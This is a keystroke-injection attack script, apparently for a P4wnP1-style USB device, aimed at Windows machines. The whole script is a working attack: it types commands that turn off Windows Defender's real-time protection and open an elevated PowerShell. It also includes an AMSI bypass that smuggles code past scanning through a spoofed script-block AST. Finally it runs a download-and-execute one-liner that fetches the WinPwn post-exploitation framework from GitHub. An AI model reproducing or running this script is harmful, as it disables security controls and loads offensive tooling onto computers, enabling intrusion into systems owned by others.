/*
AMSI Bypass Skript-Block-Smuggling, load Winpwn from Web
https://github.com/S3cur3Th1sSh1t/WinPwn
author: Klau5t4ler0x90 
Spacial Thanks to S3cur3Th1sSh1t
*/

ps_wow64='%SystemRoot%\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe'
ps="powershell.exe"

// sets typing speed to "natural"
function natural() {
  typingSpeed(100,150)	// Wait 100ms between key strokes + an additional random value between 0ms and 150ms (natural)
}

// sets typing speed as fast as possible
function fast() {
  typingSpeed(0,0)
}

// Open an interactive PowerShell console (Windows)
function startPS() {
	press("GUI r");
	delay(500);
	type("powershell\n")
}

function win10AsAdmin() {
    press("GUI"); //open search
    delay(500);
    type(ps); //enter target binary
    delay(1000); // wait for search to finish
    press("RIGHT");
    delay(200);
    press("DOWN");
    delay(200);
    press("ENTER");
    delay(1000); 
    press("LEFT");
    press("ENTER");
}

function backToTemp() {
    type("cd ..");
  press("ENTER");
  type("cd ..");
  press("ENTER");
  type("cd ..");
  press("ENTER");
  type("cd temp");
  press("ENTER");
}

function disableDefender() {
  press("GUI r");
  delay(1000);
  type("windowsdefender://ThreatSettings");
  delay(1000);
  press("ENTER");
  delay(2000);
  press("SPACE");
  delay(2000);
  press("SHIFT TAB");
  delay(500);
  press("ENTER");
  delay(500);
  press("ALT F4");
}

// Execute Invoke-SentryScript.ps1 from Web over IEX
function AMSIBypass() {
  type("$531 = (new-Object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/WinPwn.ps1')");
  press("ENTER");
  type("$SpoofedAst = [ScriptBlock]::Create(\"Write-Output 'Hello'\").Ast")
  press("ENTER");
  type("$ExecutedAst = [ScriptBlock]::Create(\"$531\").Ast")
  press("ENTER");
  type("$Ast = [System.Management.Automation.Language.ScriptBlockAst]::new($SpoofedAst.Extent, $null, $null, $null, $ExecutedAst.EndBlock.Copy(),$null)")
  press("ENTER");
  type("$Sb = $Ast.GetScriptBlock()");
  press("ENTER");
  type("& $Sb");
  press("ENTER");
}

function loadWinpwn() {
  type("iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/WinPwn.ps1')");
  press("ENTER");
  delay(300);
  type("winpwn");
  press("ENTER");
}

layout('de');			// DE keyboard layout
fast();

disableDefender();
delay(500);
win10AsAdmin();
delay(1000);
backToTemp();
delay(1100);
//startPS();
//delay(500);
//AMSIBypass();
loadWinpwn();
